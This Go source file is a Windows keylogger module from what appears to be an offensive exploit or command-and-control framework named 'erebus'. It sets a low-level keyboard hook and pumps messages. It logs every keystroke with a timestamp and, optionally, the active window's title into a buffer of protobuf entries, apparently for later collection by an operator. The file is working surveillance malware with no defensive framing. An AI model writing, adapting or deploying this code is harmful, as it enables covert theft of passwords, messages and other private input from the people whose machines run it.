//go:build windows

package tasks

import (
	"sync"
	"time"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
)

var (
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procPeekMessageW        = user32.NewProc("PeekMessageW")
	procTranslateMessage    = user32.NewProc("TranslateMessage")
	procDispatchMessageW    = user32.NewProc("DispatchMessageW")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW      = user32.NewProc("GetWindowTextW")
	procGetKeyNameTextW     = user32.NewProc("GetKeyNameTextW")
	procMsgWaitForMultipleObjects = user32.NewProc("MsgWaitForMultipleObjectsEx")
)

const (
	whKeyboardLL = 13
	wmKeydown    = 0x0100
)

type kbdLLHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

type msgStruct struct {
	HWND    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

var (
	keylogMu             sync.Mutex
	keylogRunning        bool
	keylogHook           uintptr
	keylogStopCh         chan struct{}
	keylogCaptureTitles  bool
)

func startKeylogger(captureTitles bool) error {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if keylogRunning {
		return nil // Already running
	}

	keylogCaptureTitles = captureTitles
	keylogStopCh = make(chan struct{})
	keylogRunning = true

	go keylogMessagePump()

	return nil
}

func stopKeylogger() {
	keylogMu.Lock()
	defer keylogMu.Unlock()

	if !keylogRunning {
		return
	}

	close(keylogStopCh)
	keylogRunning = false
}

const (
	pmRemove   = 0x0001
	qsAllinput = 0x04FF
)

func keylogMessagePump() {
	hookProc := windows.NewCallback(keylogHookCallback)

	hook, _, _ := procSetWindowsHookExW.Call(
		whKeyboardLL,
		hookProc,
		0,
		0,
	)
	if hook == 0 {
		return
	}

	keylogMu.Lock()
	keylogHook = hook
	keylogMu.Unlock()

	defer func() {
		procUnhookWindowsHookEx.Call(hook)
		keylogMu.Lock()
		keylogHook = 0
		keylogRunning = false
		keylogMu.Unlock()
	}()

	var msg msgStruct
	for {
		select {
		case <-keylogStopCh:
			return
		default:
		}

		// Wait for messages with 100ms timeout so we can check stop channel
		procMsgWaitForMultipleObjects.Call(
			0, 0, 0,
			100,       // 100ms timeout
			qsAllinput,
		)

		// Non-blocking message peek + dispatch
		for {
			ret, _, _ := procPeekMessageW.Call(
				uintptr(unsafe.Pointer(&msg)),
				0, 0, 0,
				pmRemove,
			)
			if ret == 0 {
				break
			}
			procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
			procDispatchMessageW.Call(uintptr(unsafe.Pointer(&msg)))
		}
	}
}

func keylogHookCallback(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && wParam == wmKeydown {
		kbd := (*kbdLLHookStruct)(unsafe.Pointer(lParam))

		// Get key name
		scanCode := kbd.ScanCode << 16
		keyNameBuf := make([]uint16, 64)
		procGetKeyNameTextW.Call(
			uintptr(scanCode),
			uintptr(unsafe.Pointer(&keyNameBuf[0])),
			64,
		)
		keyName := windows.UTF16ToString(keyNameBuf)

		entry := &pb.KeylogEntry{
			Keys:      keyName,
			Timestamp: time.Now().UnixMilli(),
		}

		if keylogCaptureTitles {
			hwnd, _, _ := procGetForegroundWindow.Call()
			if hwnd != 0 {
				titleBuf := make([]uint16, 256)
				procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&titleBuf[0])), 256)
				entry.WindowTitle = windows.UTF16ToString(titleBuf)
			}
		}

		globalKeylogBuffer.Add(entry)
	}

	ret, _, _ := procCallNextHookEx.Call(keylogHook, uintptr(nCode), wParam, lParam)
	return ret
}
